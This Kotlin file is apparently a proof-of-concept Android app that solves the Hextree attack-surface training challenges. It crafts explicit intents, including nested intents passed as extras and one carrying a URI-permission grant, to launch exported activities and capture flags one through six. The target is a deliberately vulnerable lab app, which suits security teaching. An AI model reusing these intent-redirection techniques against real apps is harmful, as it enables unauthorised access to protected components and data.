package com.vishal2376.hextreepoc

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import androidx.core.net.toUri

/**
 * Author: Vishal Singh (vishal2376)
 */

class Attack(private val context: Context) {

	private val packageName = "io.hextree.attacksurface"

	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		context.startActivity(intent)

		Utils.dumpIntent(context, intent, title = "Flag 1 Intent")
	}

	fun flag2() {
		val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"
		val customAction = "io.hextree.action.GIVE_FLAG"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = customAction

		Utils.dumpIntent(context, intent, title = "Flag 2 Intent")

		context.startActivity(intent)
	}

	fun flag3() {
		val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"
		val customAction = "io.hextree.action.GIVE_FLAG"
		val customUri = "https://app.hextree.io/map/android".toUri()

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = customAction
		intent.data = customUri

		Utils.dumpIntent(context, intent, title = "Flag 3 Intent")

		context.startActivity(intent)
	}

	fun flag4() {
		val activityPath = "$packageName.activities.Flag4Activity"

		val customActions = listOf(
			"PREPARE_ACTION",
			"BUILD_ACTION",
			"GET_FLAG_ACTION",
			null
		)

		customActions.forEachIndexed { i, action ->
			val intent = Intent()
			intent.setClassName(packageName, activityPath)
			intent.action = action
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

			Handler(Looper.getMainLooper()).postDelayed({
				Utils.dumpIntent(context, intent, title = "Flag 4 Intent $i")
				context.startActivity(intent)
			}, i * 500L)
		}
	}

	fun flag5() {
		val activityPath = "$packageName.activities.Flag5Activity"

		val intent3 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("reason", "back")
		}

		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
		}

		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
		context.startActivity(intent)
	}

	fun flag6() {
		val activityPath = "$packageName.activities.Flag5Activity"
		val newActivityPath = "$packageName.activities.Flag6Activity"

		val intent3 = Intent().apply {
			setClassName(packageName, newActivityPath)
			putExtra("reason", "next")
			flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
		}

		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
			flags = Intent.FLAG_ACTIVITY_NEW_TASK
		}

		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
		context.startActivity(intent)
	}
}
